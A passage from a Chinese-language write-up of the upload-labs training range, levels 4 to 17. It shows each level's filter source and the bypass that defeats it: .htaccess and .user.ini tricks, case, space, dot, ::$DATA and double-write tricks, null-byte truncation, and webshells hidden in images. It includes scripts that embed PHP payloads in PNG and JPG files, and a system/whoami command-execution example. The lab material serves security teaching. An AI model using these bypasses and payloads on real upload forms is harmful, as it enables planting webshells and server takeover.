class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现又是黑名单过滤，不过这次过滤了一长串，第三问提出的其他后缀名也都被过滤掉了，所以可以尝试上传<strong>.htaccess</strong>文件之后，在上传一个.jpg后缀的一句话木马，之后用蚁剑连接就行了</p><h4 id="pass-05（-user-ini）"><a href="#pass-05（-user-ini）" class="headerlink" title="pass-05（.user.ini）"></a>pass-05（.user.ini）</h4><p>查看源码发现把第四关的.htaccess文件过滤掉了，所以必须另寻他法。发现有<strong>.user.ini</strong>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess 文件有同样效果。</span><br><span class="line"></span><br><span class="line">除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line">在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</span><br></pre></td></tr></table></figure><p><strong>php.ini</strong> 是 php的配置文件，<strong>.user.ini</strong> 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><p>但是想要引发 .user.ini 解析漏洞需要三个前提条件：</p><p>1、服务器脚本语言为PHP  </p><p>2、服务器使用CGI／FastCGI模式  </p><p>3、上传目录下要有可执行的php文件</p><p>编写<strong>.user.ini</strong>文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure><p>接着上传一句话木马shell.jpg，此时直接用用蚁剑连接返回值是为空的，查看提示知道还有一个<strong>readme.php</strong>，连接这个php文件就可以连接成功了</p><h4 id="pass-06（大写绕过）"><a href="#pass-06（大写绕过）" class="headerlink" title="pass-06（大写绕过）"></a>pass-06（大写绕过）</h4><p>查看源码发现把第五关的.ini后缀过滤了，对比之前的源码，发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>于是我们可以尝试用大写绕过，上传<strong>shell.Php</strong>，用蚁剑连接就行了</p><h4 id="pass-07（空格绕过）"><a href="#pass-07（空格绕过）" class="headerlink" title="pass-07（空格绕过）"></a>pass-07（空格绕过）</h4><p>对比之前的源码发现没有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>该行代码是将上传文件最后的空格去掉，于是本关尝试用空格绕过，由于windows会自动将文件名最后的空格去掉，所以用burpsuite抓包修改文件名在最后面加上一个空格发现上传成功，之后用蚁剑连接就行了</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407201340478.png" alt=""></p><h4 id="pass-08（点绕过）"><a href="#pass-08（点绕过）" class="headerlink" title="pass-08（点绕过）"></a>pass-08（点绕过）</h4><p>查看源码发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>于是我们可以尝试用点绕过，即上传<code>shell.php.</code>，发现上传成功并解析成功，直接用蚁剑连接</p><h4 id="pass-09（-DATA绕过）"><a href="#pass-09（-DATA绕过）" class="headerlink" title="pass-09（::DATA绕过）"></a>pass-09（::DATA绕过）</h4><p>查看源码发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>于是可以尝试用<code>::$DATA</code>来绕过，用bp抓包并在后缀名后面加上<code>::$DATA</code></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407212358757.png" alt=""></p><p>上传成功，蚁剑连接的时候注意要把后面的<code>::$DATA</code>去掉再连接</p><h4 id="pass-10（点加空格绕过）"><a href="#pass-10（点加空格绕过）" class="headerlink" title="pass-10（点加空格绕过）"></a>pass-10（点加空格绕过）</h4><p>查看源码发现前面的关卡的绕过姿势都被ban了，只能另寻他路，发现<code>deldot</code>函数有个特性，其检查点是从右往左检查点，但是遇到空格会停下来，于是不难想到我们可以通过<code>. .</code>来绕过，即上传<code>shell.php. .</code>来绕过</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220011997.png" alt=""></p><p>接下来用蚁剑连接即可</p><h4 id="pass-11（双写绕过）"><a href="#pass-11（双写绕过）" class="headerlink" title="pass-11（双写绕过）"></a>pass-11（双写绕过）</h4><p>查看源码可知</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>采用str_ireplace函数来替换掉文件名包含的黑名单后缀名，将其值替换为空字符串，于是可以尝试双写绕过<br>既可以上传<code>shell.pphphp</code>，由于这个函数只进行一次，故会将pphphp中间的php去掉，后缀名就变为了php</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220032308.png" alt="image-20240722003221113"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220034488.png" alt="image-20240722003454419"></p><p>发现上传的图片的文件名确实变成了<code>shell.php</code>，用蚁剑连接即可</p><h4 id="pass-12（GET-00截断）"><a href="#pass-12（GET-00截断）" class="headerlink" title="pass-12（GET %00截断）"></a>pass-12（GET %00截断）</h4><p><strong>ps：本关复现条件：</strong></p><p><strong>1、php版本小于5.3.29</strong></p><p><strong>2、magic_quotes_gpc = Off</strong></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现此关限制了上传的文件名后缀只能为<code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>，故为白名单过滤。同时还给了一个<code>save_path</code>参数需要我们进行GET传参，即上传路径可控。最终文件的存放位置是以拼接的方式，可以使用%00截断。原理：php的一些函数的底层是C语言，而<code>move_uploaded_file</code>就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220102415.png" alt="image-20240722010252303"></p><p>由于我的phpstudy的原因（php版本过高）而不能复现，故只讲解法。上传shell.php文件，在<code>/upload/</code>后面接上<code>shell.php%00</code>，并将上传的文件名改为shell.jpg，这样拼接时遇到<code>%00</code>就会截断，事实上只解析了shell.php而没有后面一部分，故蚁剑连接的时候也只用输入到shell.php即可</p><h4 id="pass-13（POST-0x00截断）"><a href="#pass-13（POST-0x00截断）" class="headerlink" title="pass-13（POST 0x00截断）"></a>pass-13（POST 0x00截断）</h4><p>PHP环境要求同<strong>pass-12</strong>，与上一关不同的点就在于此关是post传参控制上传路径，解题方法类似</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407221120341.png" alt="1721618379467"></p><p>注意shell.php后面是有一个%00的，由于在post传参里面，需要进行URL decode，bp里面进行URL decode只需选中要解码的内容，右键选择<code>Convert selection</code>———<code>URL</code>———<code>URL-decode</code>，用蚁剑连接的时候只需把文件名写到shell.php就行了</p><h4 id="pass-14（图片码）"><a href="#pass-14（图片码）" class="headerlink" title="pass-14（图片码）"></a>pass-14（图片码）</h4><p>本关要求上传图片码，图片码制作如下</p><p><strong>Linux：</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat shell.php &gt;&gt; shell.jpg</span><br></pre></td></tr></table></figure><p><strong>shell.php</strong>是一句话木马，<strong>shell.jpg</strong>是正常的图片，执行后<code>cat shell.jpg</code>查看<strong>shell.jpg</strong>可以发现一句话木马写到了图片后面</p><p><strong>windows:</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">1</span>.php/a <span class="number">2</span>.jpg  </span><br></pre></td></tr></table></figure><p><strong>1.jpg</strong>是正常图片，<strong>1.php</strong>是一句话木马，<strong>2.jpg</strong>是制作的图片码<br>制作完成之后就可以直接上传了</p><p>上传之后，可以通过GET传参搭配文件包含漏洞来测试是否上传成功</p><h4 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h4><p>本关同<strong>pass-14</strong></p><h4 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h4><p>本关同<strong>pass-14</strong>和<strong>pass-15</strong>，但是需要打开php_exif</p><h4 id="pass-17（二次渲染）"><a href="#pass-17（二次渲染）" class="headerlink" title="pass-17（二次渲染）"></a>pass-17（二次渲染）</h4><p><strong>二次渲染原理：</strong><br>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p><p><strong>二次渲染绕过：</strong></p><ol><li>配合文件包含漏洞：<br>将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</li><li>配合条件竞争：<br>这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传。</li></ol><p>这里先介绍结合文件包含漏洞绕过，包括<strong>gif</strong>文件、<strong>jpg</strong>文件、<strong>png</strong>文件绕过</p><h5 id="GIF文件绕过"><a href="#GIF文件绕过" class="headerlink" title="GIF文件绕过"></a>GIF文件绕过</h5><p>先制作gif图片码，上传到靶场</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241809406.png" alt="image-20240724180939189"></p><p>右键图片，新页面查看并另存到电脑里面，打开<code>010editor</code>工具打开下载的图片和图片码比较哪部分没有改变(顶部选择工具—-比较文件)<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241812614.png" alt="image-20240724181208300"></p><p>选中匹配，十六进制中蓝色部分即为匹配的地方，也就是二次渲染没有进行更新的地方，我们在这里插入一句话木马，并保存图片。重复上面的操作，上传之后再下载对比看看木马是否还存在。<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241917642.png" alt="image-20240724191735308"></p><p>木马还在，接着结合文件包含漏洞用蚁剑连接即可</p><h5 id="PNG文件绕过"><a href="#PNG文件绕过" class="headerlink" title="PNG文件绕过"></a>PNG文件绕过</h5><p>尝试和gif一样的手法绕过，对比下来发现只有png文件头是一样的，如果修改这一部分则会导致文件不是png文件，所以要另寻他法。<br>先介绍一下相关知识：</p><p><strong>png图片格式组成</strong>：</p><p>png图片由3个以上的数据块组成.</p><p>png定义了两种类型的数据块，一种是称为<strong>关键数据块(critical chunk)</strong>，这是标准的数据块，另一种叫做<strong>辅助数据块(ancillary chunks)</strong>，这是可选的数据块。<br>关键数据块定义了3个标准数据块<strong>(IHDR,IDAT, IEND)</strong>，每个PNG文件都必须包含它们：</p><p><strong>IHDR</strong></p><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p><strong>PLTE</strong></p><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>有两种方法写入php代码：</p><h6 id="1、写入PLTE模块"><a href="#1、写入PLTE模块" class="headerlink" title="1、写入PLTE模块"></a>1、写入PLTE模块</h6><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，只有索引图像才可以成功插入 payload。附上payload图片：<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407242145860.png" alt="webshell"></p><p>蚁剑的连接密码为1</p><h6 id="2、写入IDAT模块"><a href="#2、写入IDAT模块" class="headerlink" title="2、写入IDAT模块"></a>2、写入IDAT模块</h6><p>运行php脚本如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php IDAT_PNG.php shell.png</span><br></pre></td></tr></table></figure><p><code>IDAT_PNG.php</code>是脚本名称，<code>shell.png</code>是一张png后缀的图片，运行后会生成一个<code>1.png</code>的文件，用<code>010editor</code>查看<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251047952.png" alt="image-20240725104741788"></p><p>发现木马已经被写入，对0进行GET传参，对1进行POST传参。例如GET:?0=system POST:1=whoami，用hackbar传参<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251116318.png" alt="image-20240725111629082"></p><p>发现命令执行成功</p><h5 id="JPG文件绕过"><a href="#JPG文件绕过" class="headerlink" title="JPG文件绕过"></a>JPG文件绕过</h5><p>直接上脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ 